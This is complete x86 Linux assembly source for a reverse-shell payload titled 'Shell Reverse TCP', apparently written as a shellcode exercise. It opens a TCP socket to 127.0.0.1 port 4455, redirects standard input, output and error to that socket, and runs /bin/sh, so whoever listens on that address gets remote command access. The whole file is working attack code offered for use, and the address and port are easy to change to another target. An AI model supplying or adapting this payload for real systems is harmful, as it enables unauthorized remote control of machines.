; Shell Reverse TCP
; Written by Hussien Yousef

global _start

section .text
_start:

; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
xor eax, eax
push eax
mov al, 102
xor ebx, ebx
mov bl, 1
push 1
push 2
mov ecx, esp
int 0x80

; connect(sockfd, *sockaddr_in, srv_add_len)
xor edx, edx
mov dl, 102
xchg eax, edx
xor ebx, ebx
; sockaddr_in struct
; push ip byte by byte
push byte 0x01
mov byte [esp-1], bl
mov byte [esp-2], bl
mov byte [esp-3], 0x7F
sub esp, 3
;push 0x0100007F ; 127.0.0.1
push word 0x6711 ; port 4455
mov bl, 3
push word 2
mov ecx, esp
; args to connect
push 16
push ecx
push edx
mov ecx, esp
int 0x80


; dup2(sockfd, 2) dup2(sockfd, 1) dup2(sockfd, 0)
mov ebx, edx
xor ecx, ecx
mov cl, 2
rotate:
xor eax, eax
mov al, 63
int 0x80
dec ecx
jns rotate


; execve("/bin/sh", null, null)
jmp short get_str_addr
spawn_shell:
pop ebx
xor eax, eax
mov al, 11
xor ecx, ecx
xor edx, edx
int 0x80

get_str_addr:
call spawn_shell
my_shell: db "/bin/sh"
